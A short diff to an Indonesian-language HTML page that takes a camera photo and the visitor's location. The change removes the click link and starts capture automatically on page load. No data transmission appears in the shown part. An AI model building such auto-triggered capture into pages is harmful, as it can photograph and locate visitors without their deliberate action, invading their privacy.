@@ -3,13 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Ambil Foto dan Lokasi</title>
+    <title>Ambil Foto dan Lokasi Otomatis</title>
 </head>
 <body>
-    <h1>Ambil Foto dan Lokasi</h1>
-    <a href="#" onclick="capturePhotoAndLocation()">Klik di sini untuk mengambil foto dan lokasi</a>
+    <h1>Ambil Foto dan Lokasi Otomatis</h1>
     
-    <br><br>
     <video id="video" width="320" height="240" autoplay></video>
     <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
     <br>
@@ -17,6 +15,11 @@
     <p id="location">Lokasi akan muncul di sini</p>
 
     <script>
+        window.onload = function() {
+            capturePhotoAndLocation();
+        }
+
+        // Fungsi untuk mengambil foto dan lokasi
         function capturePhotoAndLocation() {
             // Ambil Foto Menggunakan Kamera
             var video = document.getElementById('video');
